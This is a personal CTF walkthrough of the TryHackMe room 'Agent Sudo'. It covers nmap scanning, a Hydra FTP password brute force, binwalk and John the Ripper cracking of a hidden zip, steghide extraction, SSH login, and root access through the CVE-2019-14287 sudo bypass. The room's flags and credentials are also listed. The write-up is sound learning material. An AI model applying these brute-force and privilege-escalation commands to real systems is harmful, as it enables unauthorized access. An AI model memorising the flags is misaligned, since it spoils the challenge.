---
creation date: May 18th 2023
last modified date: May 18th 2023
aliases: []
tags: #🎌
---

Primary Categories:
Secondary Categories:  
Links: 
Search Tag: #🎌  

# [[THM - Agent Sudo]]  


# Resolution summary
- 

## Improved skills
- Stego has improved a lot in what to look for and mostly what not to!!

## Used tools
- [[nmap]]
- [[Steganography]]
- [[binwalk]]
- [[Hydra]]
- [[John the Ripper]]
- [[CyberChef]]

---

# Information Gathering
Scanned/Enumerated all TCP ports:
```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef1f5d04d47795066072ecf058f2cc07 (RSA)
|   256 5e02d19ac4e7430662c19e25848ae7ea (ECDSA)
|_  256 2d005cb9fda8c8d880e3924f8b4f18e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 80
- Located a website that stated:
```Website
Dear agents,  
  
Use your own **codename** as user-agent to access the site.  
  
From,  
Agent R
```
- We can assume because its signed by **Agent R** that the codenames are letters so lets try that:
	- Changing the user-agent of the web-request either by using Burpsuite or most browsers have a Dev tool that will allow us to set a custom agent.
	- We used **A** as our codename through the dev tools
		- Three Dots in Top Corner > More Tools > Network Conditions
		- This just leads to a new generic page no useful info
	- Using **C** gives us a message with the name **Chris** at the top
		- Assuming the is the full name for **Agent C**
		- The message also conveys that his password is really weak

---

# Exploitation
## FTP User Brute-force
- We located username of **Agent C** which is **chris**
- Using this as a username for the FTP server we found earlier we feed it into [[Hydra]] against rockyou.txt
```AccountPass
chris:crystal
```
- We find three files in the server two images and a text file saying that the images contain the password

## Image Zip Extraction/Cracking
- Checking first image found on the FTP server `cutie.png` running it through [[binwalk]] we find that its a **zip** hidden as an image so we extract that with
```bash
binwalk -e cutie.png
```
- This leads to a zip folder that is password protected:
```bash
zip2john 8702.zip > 8702_johnReady && john --wordlist=/usr/share/wordlists/rockyou.txt 8702_johnReady
```
- This command will prepare the zip for [[John the Ripper]] then a second command will run the actual crack with John against the rockyou.txt
	- Zip Pass Located: **alien**
	- Passing this to the zip file we get a file containing:
```To_agent_R.txt
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```
- **QXJlYTUx** Only interesting part is this phrase that seems scrambled
	- I put this into [[CyberChef]] and it suggested **BASE64**
	- Results using `From BASE64` = **Area51**

## Image Steganography Extraction
- We found **Area51** inside the ZIP from last section so possibly might be another password.
- Ran the other image we got through [[steghide]] and entered **Area51** for password we got a text file:
```cute-alien.jpg
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```
- Success we found more creds!!!!
```AccountPass
james:hackerrules!
```
- Tried these against the SSH port we found open and we are in!!!!

---

# Lateral Movement to user
## Local Enumeration
### SSH 
- `james:hackerrules!`
```bash
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```
- **(ALL, !root) /bin/bash** looks interesting putting that into google shows [CVE-2019-14287](https://www.exploit-db.com/exploits/47502)
- Simply running `sudo -u#-1 /bin/bash` gave us **root**!!!!


## Lateral Movement vector


---

# Privilege Escalation
## Local Enumeration


## Privilege Escalation vector


---

# Trophy & Loot

user.txt = **b03d975e8c92a7c04146cfa7a5a313c7**
root.txt = **b53a02f55b57d4439e3341834d70c062**

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: May 18th 2023 (03:26 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
